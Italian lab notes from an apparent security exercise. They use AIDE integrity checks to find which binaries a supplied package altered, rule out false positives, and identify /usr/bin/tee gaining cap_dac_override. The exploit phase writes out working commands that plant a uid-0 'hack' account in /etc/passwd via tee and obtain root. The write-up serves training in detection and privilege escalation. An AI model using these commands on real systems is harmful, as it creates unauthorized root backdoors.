@@ -1,0 +1,158 @@
+INTEGRITY.TXT — Esercizio 11 gennaio 2024 (change4)
+Integrity check & privilege escalation — Fase 1
+
+===========================================================
+STRATEGIA — procedura generale per trovare le modifiche
+(riusabile per ogni changeN / pacchetto .deb della famiglia)
+===========================================================
+
+1. Config AIDE (PRIMA di tutto — Gate A):
+   In /etc/aide/aide.conf, commentare la riga
+     @@x_include /etc/aide/aide.conf.d ^[a-zA-Z0-9_-]+$
+   (il preset di default NON copre /usr/bin), e aggiungere in fondo al file:
+     /usr/bin f Full
+     /etc f Full
+   Attenzione alla sintassi: "f" da solo, NESSUN trattino prima (errore fatto e corretto in
+   questo esercizio: avevo scritto "/usr/bin -f Full", sintassi non valida).
+   Farlo PRIMA di creare la baseline: se la baseline si crea con le modifiche già presenti,
+   il confronto successivo non le rileva (il "prima" diventa già "normale").
+
+2. Baseline sul sistema pulito:
+     sudo aideinit
+     sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db
+   aideinit copia automaticamente aide.db.new in aide.db SOLO se aide.db non esiste già —
+   copiare sempre a mano per essere sicuri di usare la baseline appena creata (con le regole
+   /usr/bin e /etc attive).
+
+3. Eseguire il file fornito:
+     chmod +x change4
+     sudo ./change4
+
+4. Confrontare:
+     sudo aide -C -c /etc/aide/aide.conf
+
+5. Leggere la riga di sintesi di ogni entry cambiata (formato: "f X.... .c....X .+ : /path"):
+   - primo carattere: f = file, d = directory
+   - 2° carattere: "=" size invariata, ">" cresciuta, "<" diminuita
+   - le lettere che seguono (posizioni fisse) indicano gli attributi CAMBIATI, un punto = invariato:
+       p = permessi, A = ACL, X = xattr (capability!), c = ctime, m = mtime
+   - "c" da solo (ctime), senza nient'altro: cambia quasi ad ogni tocco del file, da solo è RUMORE
+   - la sezione "Detailed information" sotto mostra il valore prima | dopo di ogni attributo
+     effettivamente cambiato — è lì che si legge la sostanza
+
+6. Per OGNI file segnalato (Gate B — non fermarsi al primo), verificare con il comando giusto se
+   il cambiamento è un vettore reale o un vicolo cieco — il diff AIDE dice SOLO "qualcosa è
+   cambiato", mai "questo è sfruttabile":
+   - X/xattr su un binario  → getcap <file>
+       (un output vuoto tipo "/path =" significa capability impostata e poi ripristinata dallo
+       stesso processo che ha fatto la modifica: FALSO POSITIVO, non conta)
+   - A (ACL)                → getfacl <file>
+   - p (permessi) su un binario, senza altro → ls -l <file> (cercare la "s": SUID nuovo?)
+   - un cambiamento che TOGLIE un privilegio (es. bit di scrittura rimosso) non è mai un vettore:
+     un'escalation deve DARE un potere, non toglierlo
+
+===========================================================
+RISULTATO — diff AIDE (4 entry modificate su 5205 totali)
+===========================================================
+
+f =.... .c..... .  : /etc/sudoers
+f =.... .c....X .+ : /usr/bin/grep
+f =.... .c....X .+ : /usr/bin/tee
+f =.p.. .c...A. .  : /usr/bin/vim.tiny
+
+===========================================================
+ANALISI FILE PER FILE
+===========================================================
+
+1. /etc/sudoers
+   Diff: solo Ctime cambiato (2026-06-18 11:45:11 -> 2026-07-14 10:39:51), nessun altro attributo.
+   -> RUMORE puro. Vicolo cieco.
+
+2. /usr/bin/grep
+   Diff: XAttrs num=0 -> num=1 (capability aggiunta secondo AIDE).
+   Verifica: getcap /usr/bin/grep -> "/usr/bin/grep ="  (capability set presente ma VUOTO)
+   -> FALSO POSITIVO: change4 ha impostato una capability e poi l'ha immediatamente ripristinata/
+      svuotata nello stesso processo (tecnica "mycapfake" già documentata in altri casi del pool).
+      Nessun potere reale rimasto. Vicolo cieco.
+
+3. /usr/bin/vim.tiny
+   Diff: Perm -rwxr-xr-x -> -r-xr-xr-x (TOLTO il bit di scrittura al proprietario) + ACL coerente
+   (A: user::rwx -> r-x).
+   Verifica: getcap /usr/bin/vim.tiny -> nessun output, nessuna capability.
+   -> Il cambiamento toglie un privilegio, non ne dà uno: non è un vettore di escalation.
+      Vicolo cieco.
+
+4. /usr/bin/tee
+   Diff: XAttrs num=0 -> num=1 (capability aggiunta).
+   Verifica: getcap /usr/bin/tee -> "/usr/bin/tee cap_dac_override=ep"
+   -> VETTORE REALE. cap_dac_override fa sì che tee ignori ogni controllo di permesso Unix in
+      lettura/scrittura sui file: chiunque lo esegua può scrivere QUALUNQUE file del filesystem,
+      incluso /etc/passwd (di proprietà root), pur non essendo tee SUID e pur non essendo
+      l'utente root.
+
+===========================================================
+CONCLUSIONE FASE 1
+===========================================================
+
+Su 4 file segnalati da AIDE: 1 è rumore puro (solo ctime su /etc/sudoers), 2 sono vicoli ciechi
+verificati con il comando giusto (capability svuotata su grep; privilegio tolto — non dato — su
+vim.tiny), 1 è il vettore reale: /usr/bin/tee ha ottenuto cap_dac_override, che gli permette di
+scrivere qualsiasi file bypassando i permessi standard.
+
+===========================================================
+FASE 2 — EXPLOIT (come kali, senza sudo)
+===========================================================
+
+Consegna: creare l'utente "hack" con privilegi di root e password "hack", usando il file
+modificato da change4, poi diventare hack e lanciare id.
+
+Perché non un redirect diretto:
+  echo "hack:...:0:0::/root:/bin/bash" >> /etc/passwd    # Permission denied
+fallisce perché è la SHELL ad aprire il file per il redirect ">>", e la shell ha solo i
+permessi normali di kali. cap_dac_override è attaccata al binario tee, non a chi lo lancia:
+si attiva solo quando è tee stesso ad aprire il file di destinazione. Per questo il pattern
+è sempre "manda il contenuto in pipe a tee, dagli il file come argomento", mai un redirect
+diretto sul file protetto.
+
+Comandi eseguiti:
+
+  openssl passwd -1 -salt hack hack
+  -> $1$hack$xR6zsfvpez/t8teGRRSNr.
+     (-1 = MD5-crypt; -salt hack = salt fisso per riproducibilità; il 2° "hack" è la password
+     da hashare. Il formato storico di /etc/passwd accetta l'hash inline nel 2° campo, quindi
+     non serve toccare /etc/shadow)
+
+  cat /etc/passwd > passwd_editable
+  # riga aggiunta con un editor di testo (7 campi: utente:hash:uid:gid:gecos:home:shell):
+  #   hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:hack:/root:/bin/bash
+
+  cat passwd_editable | tee /etc/passwd
+  # tee (cap_dac_override) apre /etc/passwd e lo sovrascrive con la copia modificata --
+  # operazione che a kali, da solo, sarebbe negata
+
+  grep hack /etc/passwd
+  -> hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:hack:/root:/bin/bash
+
+  su hack
+  Password: hack
+  id
+  -> uid=0(root) gid=0(root) groups=0(root)
+
+Screenshot: privesc.png (grep di verifica + su hack + id con prova uid=0).
+
+===========================================================
+PERCHÉ FUNZIONA (meccanismo)
+===========================================================
+
+tee con cap_dac_override ignora i controlli DAC (permessi Unix standard) in lettura/scrittura
+su qualunque file, indipendentemente da chi lo esegue. kali non ha permesso di scrittura su
+/etc/passwd (di proprietà root), ma tee sì -- ed è tee, non kali, a fare la scrittura. La riga
+aggiunta ha UID/GID 0 (root) e un hash MD5-crypt valido nel campo password: al login (su hack)
+il sistema rifà lo stesso hash sulla password digitata e la confronta con quella salvata --
+combaciano, accesso concesso con privilegi di root.
+
+Stesso obiettivo finale dell'esercizio di ieri (change1, SUID su cp: scrivere /etc/passwd come
+root), meccanismo di bypass diverso: capability invece di SUID. tee stesso è inoltre il
+"trucco" classico da amministrazione di sistema per scrivere file protetti anche con sudo
+(comando | sudo tee file, perché il redirect ">" non eredita i permessi di sudo mentre tee sì)
+-- qui lo stesso schema è sfruttato con una capability al posto di sudo.
